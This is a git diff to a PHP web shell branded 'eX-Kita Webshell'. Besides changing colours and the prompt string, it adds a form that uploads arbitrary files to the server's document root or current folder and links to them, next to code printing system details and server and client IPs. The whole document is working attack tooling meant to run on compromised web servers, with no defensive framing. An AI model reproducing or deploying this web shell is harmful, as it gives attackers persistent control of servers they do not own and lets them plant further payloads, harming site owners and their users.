@@ -136,7 +136,7 @@ if (isset($_GET["feature"])) {
             html, body {
                 margin: 0;
                 padding: 0;
-                background: #333;
+                background: rgba(40, 44, 52, 1);
                 color: #eee;
                 font-family: monospace;
             }
@@ -376,7 +376,7 @@ if (isset($_GET["feature"])) {
                     var splittedCwd = cwd.split("/");
                     shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
                 }
-                return "valeiriya@shell:<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
+                return "Exploit-Kita@org:<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
             }
 
             function updateCwd(cwd) {
@@ -482,7 +482,7 @@ if (isset($_GET["feature"])) {
     <body>
         <div id="shell">
             <pre id="shell-content"><div id="shell-logo">
-			<a href="//exploit-kita.org" target="_blank" style="text-decoration: none;color: red;">
+			<a href="#" onclick="window.location.reload(true);" style="text-decoration: none;color: red;">
            __    __         __    __  __    __               
           /  |  /  |       /  |  /  |/  |  /  |              
   ______  $$ |  $$ |       $$ | /$$/ $$/  _$$ |_     ______  
@@ -491,11 +491,31 @@ if (isset($_GET["feature"])) {
 $$    $$ |  $$$$  \$$$$$$/ $$$$$  \  $$ |  $$ | __  /    $$ |
 $$$$$$$$/  $$ /$$  |       $$ |$$  \ $$ |  $$ |/  |/$$$$$$$ |
 $$       |$$ |  $$ |       $$ | $$  |$$ |  $$  $$/ $$    $$ |
- $$$$$$$/ $$/   $$/        $$/   $$/ $$/    $$$$/   $$$$$$$/ 
-eX-Kita Webshell</a>
+ $$$$$$$/ $$/   $$/        $$/   $$/ $$/    $$$$/   $$$$$$$/ </a>
+eX-Kita Webshell
 <?php
 echo "<font color='lightblue'>System : <b>".php_uname()."</b></font><br>";
 echo "<font color='lime'>IP Server : <b>".htmlspecialchars($_SERVER['SERVER_ADDR'])."</b> | My IP : <b>".htmlspecialchars($_SERVER['REMOTE_ADDR'])."</b></font>";
+echo "<form method='post' enctype='multipart/form-data'><label for='files' style='color: white'>Filename : </label><input type='file' name='files'><input type='submit' name='upload' value='upload'></form>";
+$root = $_SERVER['DOCUMENT_ROOT'];
+$files = $_FILES['files']['name'];
+$dest = $root.'/'.$files;
+if(isset($_POST['upload'])) {
+	if(is_writable($root)) {
+		if(@copy($_FILES['files']['tmp_name'], $dest)) {
+			$web = "http://".$_SERVER['HTTP_HOST']."/";
+			echo "Success Upload -> <a href='$web$files' target='_blank' style='text-decoration:none;color:lime;'><b><u>$web$files</u></b></a>";
+			} else {
+				echo "Fail Upload to Directory Root.";
+				}
+			} else {
+				if(@copy($_FILES['files']['tmp_name'], $files)) {
+					echo "Success Upload <b>$files</b> in this folder.";
+				} else {
+					echo "FAIL";
+				}
+			}
+}
 echo "<hr width='30%'>";
 ?>
 			</div></pre>
